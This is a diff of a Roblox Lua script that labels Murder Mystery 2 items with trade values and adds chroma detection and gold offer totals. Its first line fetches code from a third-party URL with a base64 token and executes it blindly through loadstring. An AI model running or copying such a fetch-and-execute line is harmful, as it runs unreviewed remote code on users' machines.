@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImZmNjdmY2QzLWVkMTEtNDY0Ni1hOTM2LWYyMWI5OTI2OTlkYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL2dpdGh1Yi5jb20vcmVzcHB2cC1iZWVwL21tMnZhbHVlcy9lZGl0L21haW4vbWFpbi5sdWF1In19"))()
+
 local items = {
     {"ancients", "Batwing", "Batwing", "40", "https://supremevalues.com/mm2/ancients?item=Batwing", "Stable", "-2"},
     {"ancients", "Celestial", "Celestial", "1,950", "https://supremevalues.com/mm2/ancients?item=Celestial", "Stable", "-50"},
@@ -1469,10 +1470,15 @@ local items = {
 -- LocalScript: value labels + a trade comparison overlay.
 -- Snapshot: Supreme Values pages reported November 17, 2026 at 3:32 PM. Static values; verify on the source before trading.
 -- Six inventory icons mapped from the user-provided UI diagnostic and screenshot.
+-- v6: custom T1 rare baseline 0.1; gold, larger totals beside both offer headings.
+-- v4: equation follows the topbar inset; prices < 0.2 hidden; no "~"; cached chroma checks.
+-- v3: no "-" marks/ranges; "[low - high]" values use the main number; T1 values shown as numbers.
+-- Chroma vs normal: 53 chroma icon IDs + their normal icon IDs from the Nov 19 inventory dump.
 -- Unknown variants use clearly marked rarity-filtered estimates; they may be far off.
 -- Numeric values under 1 are model estimates, not official exact prices.
 -- Supreme guide: 1 value ~= 5 T1 Legendaries: https://supremevalues.com/use
--- Model: 1 value ~= 5 T1 Legendary; 1 T1 Legendary ~= 4 T1 Rare;
+-- Custom pricing: T1 Rare = 0.1; other baseline rates are unchanged.
+-- Original model: 1 value ~= 5 T1 Legendary; 1 T1 Legendary ~= 4 T1 Rare;
 -- 1 T1 Rare ~= 4 T1 Uncommon; 1 T1 Uncommon ~= 4 T1 Common.
 -- Individual T1 items vary; these are assumptions, not fixed market rates.
 -- Sets are kept for reference; a set is NOT automatically valued from its parts.
@@ -1483,6 +1489,8 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 local BADGE_NAME = "SupremeValueLabel"
+local reportedNames = {}
+local MIN_SHOWN = 0.1 -- prices below this are not displayed (still counted in totals)
 local STATUS_NAME = "SupremeStatusLabel"
 local CHANGE_NAME = "SupremeChangeLabel"
 local SCREEN_NAME = "SupremeTradeComparison"
@@ -1533,13 +1541,14 @@ end
 -- Conversion is an estimate based solely on Supreme's guide and examples.
 local tierRates = {
     legendary = 0.2, legendaries = 0.2,
-    rare = 0.05, rares = 0.05,
+    rare = 0.1, rares = 0.1,
     uncommon = 0.0125, uncommons = 0.0125,
     common = 0.003125, commons = 0.003125,
 }
 local function itemValue(raw)
     if not raw then return nil, false end
-    local number = tonumber((raw:gsub(",", "")))
+    local lead = raw:match("^%s*([%d,%.]+)%s*$") or raw:match("^%s*([%d,%.]+)%s*%[")
+    local number = lead and tonumber((lead:gsub(",", "")))
     if number then return number, false end
     local multiplier, tier, class = raw:lower():match("^%s*x(%d+)%s+t(%d+)%s+(%a+)%s*$")
     if multiplier and tier == "1" and tierRates[class] then
@@ -1707,12 +1716,212 @@ local function byExplicitIdentity(group, identity)
     end
     return found
 end
-local baseEstimate = { commons=0.003125, uncommons=0.0125, rares=0.05 }
+local baseEstimate = { commons=0.003125, uncommons=0.0125, rares=0.1 }
 local function isItemLabel(label)
     return label and label:IsA("TextLabel") and label.Name == "Label"
         and label.Parent and label.Parent.Name == "ItemName" and label.Parent.Parent ~= nil
 end
+
+-- Chroma detection: MM2 marks chroma cards with a visible "Chroma" tag.
+-- The tag can exist hidden on normal cards, so only visible tags count.
+local function chromaKey(text)
+    local k = normalize(text or "")
+    k = k:gsub("^chroma%s+", "")
+    k = k:gsub("^c%.%s*", "")
+    k = k:gsub("[^%w]", "")
+    return k
+end
+local chromaIndex = {}
+for _, item in ipairs(items) do
+    if item[1] == "chromas" then
+        for _, n in ipairs({item[2], item[3]}) do
+            local k = chromaKey(n)
+            if k ~= "" then
+                local old = chromaIndex[k]
+                if old == nil or old == item then chromaIndex[k] = item else chromaIndex[k] = false end
+            end
+        end
+    end
+end
+local function shownInside(obj, root)
+    while obj and obj ~= root do
+        if obj:IsA("GuiObject") and not obj.Visible then return false end
+        obj = obj.Parent
+    end
+    return true
+end
+local function isChromaCard(label)
+    local card = label and label.Parent and label.Parent.Parent
+    if not card then return false end
+    for _, d in ipairs(card:GetDescendants()) do
+        if d ~= label and (d:IsA("TextLabel") or d:IsA("TextButton"))
+            and d.Name ~= BADGE_NAME and d.Name ~= STATUS_NAME and d.Name ~= CHANGE_NAME
+            and d.TextTransparency < 1 and shownInside(d, card) then
+            local raw = (d.Text or ""):match("^%s*(.-)%s*$")
+            if raw:lower() == "chroma" or raw == "Хрома" or raw == "ХРОМА" then return true end
+        end
+    end
+    return false
+end
+-- Icon IDs from the user's inventory dump (Nov 19, 2026). Value = chromaKey of the item.
+-- Icon wins over the "Chroma" tag; the tag is only a fallback for unknown icons.
+local CHROMA_ICONS = {
+    ["104256106059730"] = "alienbeam",
+    ["137938731902685"] = "bauble",
+    ["9652"] = "beachy",
+    ["4707"] = "blizzard",
+    ["2513597845"] = "boneblade",
+    ["7806149582"] = "candleflame",
+    ["98517109155878"] = "constellation",
+    ["3356"] = "cookiecane",
+    ["4751507011"] = "darkbringer",
+    ["8941"] = "deathshard",
+    ["11255021976"] = "elderwoodblade",
+    ["6074"] = "emberbow",
+    ["4703"] = "emberscythe",
+    ["5840"] = "embersickle",
+    ["8495"] = "evergreen",
+    ["5924"] = "evergun",
+    ["6028"] = "fang",
+    ["3215184228"] = "firebat",
+    ["3215184104"] = "firebear",
+    ["3215183621"] = "firebunny",
+    ["3215183286"] = "firecat",
+    ["3215183415"] = "firedog",
+    ["3215183922"] = "firefox",
+    ["3215183776"] = "firepig",
+    ["2393"] = "gemstone",
+    ["2672351679"] = "gingerblade",
+    ["5216"] = "heartwand",
+    ["2871"] = "heat",
+    ["6571"] = "icecream",
+    ["256"] = "immortal",
+    ["6526"] = "laser",
+    ["4751507078"] = "lightbringer",
+    ["7235"] = "luger",
+    ["5349"] = "mortal",
+    ["66"] = "ornament",
+    ["83259634072260"] = "raygun",
+    ["536"] = "sands",
+    ["7658"] = "saw",
+    ["8820"] = "seer",
+    ["3218"] = "shark",
+    ["7101"] = "slasher",
+    ["5004"] = "snowcannon",
+    ["3894"] = "snowdagger",
+    ["8583"] = "snowstorm",
+    ["124766755976937"] = "sunrise",
+    ["2532"] = "sunset",
+    ["5910"] = "sweet",
+    ["8311453396"] = "swirlygun",
+    ["2694"] = "tides",
+    ["963"] = "travelersgun",
+    ["607"] = "treat",
+    ["85107391551890"] = "vampiresgun",
+    ["2484"] = "watergun",
+}
+local NORMAL_ICONS = {
+    ["77607127867154"] = "alienbeam",
+    ["84481559639371"] = "bauble",
+    ["120888453565511"] = "beachy",
+    ["7885"] = "blizzard",
+    ["88928894807422"] = "blizzard",
+    ["2513505477"] = "boneblade",
+    ["7805833970"] = "candleflame",
+    ["90595111293037"] = "candleflame",
+    ["114197436469014"] = "constellation",
+    ["11855306927"] = "cookiecane",
+    ["4751387674"] = "darkbringer",
+    ["6855"] = "deathshard",
+    ["11254879631"] = "elderwoodblade",
+    ["109700223945658"] = "emberbow",
+    ["113246722870618"] = "emberscythe",
+    ["113946366917108"] = "embersickle",
+    ["8804"] = "evergreen",
+    ["2427"] = "evergun",
+    ["6533"] = "fang",
+    ["3215186931"] = "firebat",
+    ["3215186820"] = "firebear",
+    ["3279847553"] = "firebunny",
+    ["3215185696"] = "firecat",
+    ["3215185833"] = "firedog",
+    ["3215186192"] = "firefox",
+    ["3215186086"] = "firepig",
+    ["3917"] = "gemstone",
+    ["2669336659"] = "gingerblade",
+    ["118334707962654"] = "heartwand",
+    ["3405"] = "heat",
+    ["87189663191639"] = "icecream",
+    ["112675577042738"] = "immortal",
+    ["311"] = "laser",
+    ["54798135"] = "laser",
+    ["76785021563290"] = "laser",
+    ["4751387063"] = "lightbringer",
+    ["5191"] = "luger",
+    ["72199828838672"] = "mortal",
+    ["331745428"] = "ornament",
+    ["111092946728824"] = "ornament",
+    ["139431943195380"] = "raygun",
+    ["119213058412452"] = "sands",
+    ["1034"] = "saw",
+    ["5077"] = "shark",
+    ["8780"] = "slasher",
+    ["129186939023729"] = "snowcannon",
+    ["95328449981238"] = "snowdagger",
+    ["4026"] = "snowstorm",
+    ["70973050894155"] = "snowstorm",
+    ["129480661108374"] = "sunrise",
+    ["103526268515240"] = "sunset",
+    ["120907601916735"] = "sunset",
+    ["126937716954396"] = "sweet",
+    ["8305002569"] = "swirlygun",
+    ["7152"] = "tides",
+    ["15091442039"] = "travelersgun",
+    ["131626924640663"] = "treat",
+    ["90274872705656"] = "vampiresgun",
+    ["18351388416"] = "watergun",
+}
+local function rawIconId(label)
+    local card = label and label.Parent and label.Parent.Parent
+    if not card then return nil end
+    local icon = card:FindFirstChild("Icon", true)
+    if not icon or not (icon:IsA("ImageLabel") or icon:IsA("ImageButton")) then return nil end
+    local img = icon.Image or ""
+    return img:match("[?&]id=(%d+)") or img:match("[?&]assetId=(%d+)") or img:match("(%d+)$")
+end
+-- true = chroma card, false = normal card of an item that has a chroma, nil = item has no chroma.
+local chromaCache = setmetatable({}, {__mode = "k"})
+local function chromaStateRaw(label, name)
+    local key = chromaKey(name)
+    if key == "" or not chromaIndex[key] then return nil end
+    local id = rawIconId(label)
+    if id then
+        if CHROMA_ICONS[id] == key then return true end
+        if NORMAL_ICONS[id] == key then return false end
+    end
+    return isChromaCard(label)
+end
+local function chromaState(label, name)
+    if not label then return chromaStateRaw(label, name) end
+    local id = rawIconId(label) or ""
+    local c = chromaCache[label]
+    if c and c.name == name and c.id == id then return c.state end
+    local state = chromaStateRaw(label, name)
+    if CHROMA_ICONS[id] or NORMAL_ICONS[id] then
+        chromaCache[label] = {name = name, id = id, state = state}
+    end
+    return state
+end
 local function valueRange(name, label)
+    -- Chroma cards are priced only from the chromas list, never from the normal item.
+    if isItemLabel(label) and chromaState(label, name) == true then
+        local hit = chromaIndex[chromaKey(name)]
+        if hit then
+            local amount, estimated = itemValue(hit[4])
+            if amount then return amount, amount, estimated, false, hit end
+        end
+        return nil
+    end
     local identified = itemFromIcon(label, name)
     if identified then
         local amount, estimated = itemValue(identified[4])
@@ -1723,8 +1932,6 @@ local function valueRange(name, label)
     local category = cardCategory(label)
     if not group then
         -- No catalog match: T1 rarity baseline, NOT the item's researched price.
-        local base = category and baseEstimate[category]
-        if base and isItemLabel(label) then return base, base, true, true end
         return nil
     end
     local filtered = {}
@@ -1736,8 +1943,6 @@ local function valueRange(name, label)
     -- If rarity was recognized but the snapshot has no matching item in it,
     -- use its baseline rather than pricing a different rarity with that name.
     if category and #filtered == 0 then
-        local base = baseEstimate[category]
-        if base then return base, base, true, true end
         return nil
     end
     if category then group = filtered end
@@ -1787,15 +1992,14 @@ local function valueRange(name, label)
     end
     if #values == 0 then return nil end
     table.sort(values)
-    local ambiguous = unpriced or (values[#values] - values[1] > 0.0000001)
-    -- Ambiguous values are left unpriced rather than guessed.
-    if unpriced then return nil end
-    if ambiguous then return nil end
-    return values[1], values[1], approx, false, (#group == 1 and group[1] or nil)
+    local ambiguous = values[#values] - values[1] > 0.0000001
+    -- Ambiguous: lowest variant price; click the price to choose the exact variant.
+    return values[1], values[1], approx, ambiguous, (#group == 1 and group[1] or nil)
 end
 -- Options are restricted to the exact label group and, when known, rarity.
 local function pickerChoices(label)
     if not isItemLabel(label) then return {} end
+    if chromaState(label, label.Text) == true then return {} end
     local category = cardCategory(label)
     local choices = {}
     for _, item in ipairs(candidates(label.Text) or {}) do
@@ -1805,7 +2009,7 @@ local function pickerChoices(label)
 end
 local function rangeText(low, high)
     local lo, hi = numberText(low), numberText(high)
-    return lo == hi and lo or (lo .. "-" .. hi)
+    return lo
 end
 
 updateBadge = function(label)
@@ -1813,6 +2017,20 @@ updateBadge = function(label)
     if label:FindFirstAncestor(SCREEN_NAME) or label:FindFirstAncestor(PICKER_NAME) then return end
 
     local low, high, approximate, guessed, matchedItem = valueRange(label.Text, label)
+    if isItemLabel(label) and label.Text ~= "" then
+        local reason
+        if not candidates(label.Text) and chromaState(label, label.Text) ~= true then
+            reason = "нет в базе Supreme (снимок 17.11)"
+        elseif not low then
+            reason = "на Supreme цена N/A / Priceless"
+        elseif low < MIN_SHOWN then
+            reason = "дешевле " .. tostring(MIN_SHOWN) .. " (" .. tostring(low) .. ")"
+        end
+        if reason and not reportedNames[label.Text] then
+            reportedNames[label.Text] = true
+            print("[Supreme] без цены: " .. label.Text .. " — " .. reason)
+        end
+    end
     local choices = pickerChoices(label)
     local id = iconIdFromLabel(label)
     local chosen = id and pickedIcons[normalize(label.Text) .. "|" .. id] or pickedLabels[label]
@@ -1829,7 +2047,7 @@ updateBadge = function(label)
     local badge = badgeParent:FindFirstChild(BADGE_NAME)
     if badge and not badge:IsA("TextButton") then badge:Destroy(); badge = nil end
 
-    if not candidates(label.Text) and not (isCardItem and cardCategory(label)) then
+    if not candidates(label.Text) and not (isCardItem and (cardCategory(label) or chromaState(label, label.Text) == true)) then
         if badge then badge:Destroy() end
         for _, name in ipairs({STATUS_NAME, CHANGE_NAME}) do
             local stale = label:FindFirstChild(name)
@@ -1842,9 +2060,8 @@ updateBadge = function(label)
         return
     end
 
-    local hideSmallValue = low and high and (low < 1 or high < 1)
-    local showPrice = low and high and not hideSmallValue
-    local showPickerMark = canChoose and not showPrice
+    local showPrice = low and high and low >= MIN_SHOWN
+    local showPickerMark = false
     if not showPrice and not showPickerMark then
         if badge then badge:Destroy(); badge = nil end
     elseif not badge then
@@ -1887,7 +2104,7 @@ updateBadge = function(label)
             badge.Size = UDim2.fromOffset(21, 21)
             badge.TextSize = 16
             badge.TextColor3 = Color3.fromRGB(255, 226, 135)
-            badge.Text = "?"
+            badge.Text = "—"
         else
             badge.Position = card and UDim2.new(0, 0, 0, 2) or UDim2.new(0, 1, 0, -25)
             badge.Size = card and UDim2.new(1, 0, 0, 25) or UDim2.new(1, -2, 0, 23)
@@ -1895,7 +2112,6 @@ updateBadge = function(label)
             badge.TextXAlignment = Enum.TextXAlignment.Center
             badge.TextColor3 = Color3.fromRGB(255, 226, 135)
             local shown = rangeText(low, high)
-            if approximate or guessed then shown = "~" .. shown end
             badge.Text = shown
         end
     end
@@ -2028,7 +2244,7 @@ showVariantPicker = function(label)
         name.Font = Enum.Font.SourceSansBold
         text(button, item[2], UDim2.fromOffset(12, 29), UDim2.new(0.65, -12, 0, 20), 16, Color3.fromRGB(218, 227, 241))
         local value, approx = itemValue(item[4])
-        local priceText = value and value >= 1 and ((approx and "~" or "") .. numberText(value)) or ""
+        local priceText = value and value >= MIN_SHOWN and numberText(value) or ""
         local price = text(button, priceText, UDim2.new(0.65, 0, 0, 9), UDim2.new(0.35, -12, 0, 24), 18, Color3.fromRGB(255, 225, 138))
         price.Font = Enum.Font.SourceSansBold
         price.TextXAlignment = Enum.TextXAlignment.Right
@@ -2051,7 +2267,7 @@ showVariantPicker = function(label)
             end
         end)
     end
-    text(frame, "Выбор сохраняется до перезахода • ~ значит оценка", UDim2.new(0, 18, 1, -34), UDim2.new(1, -36, 0, 22), 14, Color3.fromRGB(169, 185, 207))
+    text(frame, "Выбор сохраняется до перезахода", UDim2.new(0, 18, 1, -34), UDim2.new(1, -36, 0, 22), 14, Color3.fromRGB(169, 185, 207))
 end
 
 local function watch(object)
@@ -2069,8 +2285,13 @@ local function watch(object)
     end
     if not object:IsA("TextLabel") or object.Name == BADGE_NAME or object.Name == STATUS_NAME or object.Name == CHANGE_NAME then return end
     if object:FindFirstAncestor(SCREEN_NAME) or object:FindFirstAncestor(PICKER_NAME) then return end
+    local lastText = object.Text
     updateBadge(object)
-    object:GetPropertyChangedSignal("Text"):Connect(function() updateBadge(object) end)
+    object:GetPropertyChangedSignal("Text"):Connect(function()
+        if object.Text == lastText then return end
+        lastText = object.Text
+        updateBadge(object)
+    end)
 end
 for _, object in ipairs(playerGui:GetDescendants()) do watch(object) end
 playerGui.DescendantAdded:Connect(watch)
@@ -2094,22 +2315,22 @@ local function makeText(name, fontSize)
     label.TextWrapped = false
     label.TextXAlignment = Enum.TextXAlignment.Left
     label.TextYAlignment = Enum.TextYAlignment.Center
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextColor3 = Color3.fromRGB(255, 226, 135)
     label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    label.TextStrokeTransparency = 0.25
+    label.TextStrokeTransparency = 0.35
     label.ZIndex = 100
     label.Visible = false
     label.Parent = screen
     local limit = Instance.new("UITextSizeConstraint")
     limit.MaxTextSize = fontSize
-    limit.MinTextSize = 13
+    limit.MinTextSize = 14
     limit.Parent = label
     return label
 end
 
--- Each offer gets its own equation, positioned directly above its item slots.
-local result = makeText("YourOfferEquation", 19)
-local details = makeText("TheirOfferEquation", 19)
+-- One large gold total per side, on the header row, not over item slots.
+local result = makeText("YourOfferTotal", 30)
+local details = makeText("TheirOfferTotal", 30)
 
 local function isVisibleInside(object, root)
     local node = object
@@ -2144,35 +2365,60 @@ local function findOfferHeading(trade, offer, phrase)
     return nil
 end
 
-local function placeEquation(label, trade, offer, phrase, text)
+local GuiService = game:GetService("GuiService")
+-- Return the actual rendered text edges even for wide centered/right-aligned labels.
+local function textEdges(object)
+    local width = math.min(object.TextBounds.X, object.AbsoluteSize.X)
+    local left = object.AbsolutePosition.X
+    if object.TextXAlignment == Enum.TextXAlignment.Center then
+        left = left + (object.AbsoluteSize.X - width) / 2
+    elseif object.TextXAlignment == Enum.TextXAlignment.Right then
+        left = left + object.AbsoluteSize.X - width
+    end
+    return left, left + width
+end
+
+local function placeTotal(label, trade, offer, phrase, text)
     local container = offer and offer:FindFirstChild("Container")
-    local heading = trade and offer and findOfferHeading(trade, offer, phrase)
-    if not container or not container:IsA("GuiObject") or not container.Visible or not heading then
+    if not container or not container:IsA("GuiObject") or not container.Visible then
         label.Visible = false
         return
     end
-    -- Put the equation on the same header line as YOUR OFFER / THEIR OFFER,
-    -- never over an empty item slot. Limit the other-side line before its username.
-    local headingTextWidth = math.max(heading.TextBounds.X, 112)
-    local x = heading.AbsolutePosition.X + headingTextWidth + 8
-    local right = container.AbsolutePosition.X + container.AbsoluteSize.X - 4
-    local root = heading.Parent
-    if root then
-        for _, object in ipairs(root:GetDescendants()) do
-            if object ~= heading and (object:IsA("TextLabel") or object:IsA("TextButton")) and object.Visible then
-                local otherText = normalize(object.Text)
-                local sameRow = math.abs(object.AbsolutePosition.Y - heading.AbsolutePosition.Y) <= 8
-                if sameRow and object.AbsolutePosition.X > x and otherText:match("^%(") then
-                    right = math.min(right, object.AbsolutePosition.X - 6)
-                end
+    local heading = findOfferHeading(trade, offer, phrase)
+    local cp, cs = container.AbsolutePosition, container.AbsoluteSize
+    local x = cp.X + cs.X * 0.36
+    local right = cp.X + cs.X - 6
+    local rowTop = cp.Y - 36
+    local rowBottom = cp.Y - 2
+    if heading then
+        local _, titleRight = textEdges(heading)
+        x = math.max(cp.X, titleRight + 12)
+        rowTop = math.max(cp.Y - 40, heading.AbsolutePosition.Y)
+        rowBottom = math.min(cp.Y - 2, heading.AbsolutePosition.Y + heading.AbsoluteSize.Y)
+    end
+    -- Keep the counterparty's username readable, including right-aligned labels.
+    for _, object in ipairs(trade:GetDescendants()) do
+        if object ~= heading and (object:IsA("TextLabel") or object:IsA("TextButton"))
+            and isVisibleInside(object, trade) and normalize(object.Text):match("^%(") then
+            local top = object.AbsolutePosition.Y
+            local bottom = top + object.AbsoluteSize.Y
+            local nameLeft = textEdges(object)
+            if bottom > rowTop and top < rowBottom and nameLeft > x then
+                right = math.min(right, nameLeft - 10)
             end
         end
     end
-    local width = math.max(1, right - x)
-    label.Position = UDim2.fromOffset(x, heading.AbsolutePosition.Y)
-    label.Size = UDim2.fromOffset(width, math.max(18, heading.AbsoluteSize.Y))
-    label.Text = text
-    label.TextXAlignment = Enum.TextXAlignment.Left
+    local width, height = right - x, rowBottom - rowTop
+    if width < 16 or height < 12 then
+        label.Visible = false
+        return
+    end
+    local gui = container:FindFirstAncestorOfClass("ScreenGui")
+    local inset = (gui and not gui.IgnoreGuiInset) and GuiService:GetGuiInset() or Vector2.zero
+    label.Position = UDim2.fromOffset(x + inset.X, rowTop + inset.Y)
+    label.Size = UDim2.fromOffset(width, height)
+    label.Text = text or ""
+    label.TextXAlignment = Enum.TextXAlignment.Center
     label.Visible = text ~= nil and text ~= ""
 end
 
@@ -2188,10 +2434,9 @@ end
 
 local function sideTotalText(side)
     if not side or side.unknown > 0 then return "?" end
-    if side.low < 1 or side.high < 1 then return "0" end
+    if side.low == 0 then return "0" end
     local low, high = currencyText(side.low), currencyText(side.high)
-    local amount = low == high and low or (low .. "–" .. high)
-    if side.estimated or side.guessed then amount = "~" .. amount end
+    local amount = low
     return amount
 end
 
@@ -2252,8 +2497,8 @@ local function calculate(offer)
                         high = high + itemHigh
                         estimated = estimated or approximate
                         guessed = guessed or guess
-                        if itemLow >= 1 and itemHigh >= 1 then
-                            table.insert(parts, itemLow == itemHigh and currencyText(itemLow) or (currencyText(itemLow) .. "–" .. currencyText(itemHigh)))
+                        if itemLow >= MIN_SHOWN then
+                            table.insert(parts, currencyText(itemLow))
                         else
                             hiddenSmall = true
                         end
@@ -2297,20 +2542,25 @@ local function refresh()
     local theirsOffer = trade:FindFirstChild("TheirOffer")
     local mine = calculate(mineOffer)
     local theirs = calculate(theirsOffer)
-    local mineText = mine and mine.count > 0 and sideEquation(mine) or nil
-    local theirsText = theirs and theirs.count > 0 and sideEquation(theirs) or nil
-    placeEquation(result, trade, mineOffer, "your offer", mineText)
-    placeEquation(details, trade, theirsOffer, "their offer", theirsText)
+    -- Show both totals only while the other player offers at least one item.
+    -- Check item count, not price: unpriced items still count as an offer.
+    local hasCounterOffer = theirs ~= nil and theirs.count > 0
+    local mineText = hasCounterOffer and mine and sideTotalText(mine) or nil
+    local theirsText = hasCounterOffer and sideTotalText(theirs) or nil
+    placeTotal(result, trade, mineOffer, "your offer", mineText)
+    placeTotal(details, trade, theirsOffer, "their offer", theirsText)
+    return true
 end
 
 task.spawn(function()
     while screen.Parent do
         local ok, err = pcall(refresh)
+        local open = ok and err == true
         if not ok then
             result.Visible = false
             details.Visible = false
             warn("Supreme trade comparison: " .. tostring(err))
         end
-        task.wait(0.5)
+        task.wait(open and 0.35 or 1)
     end
 end)
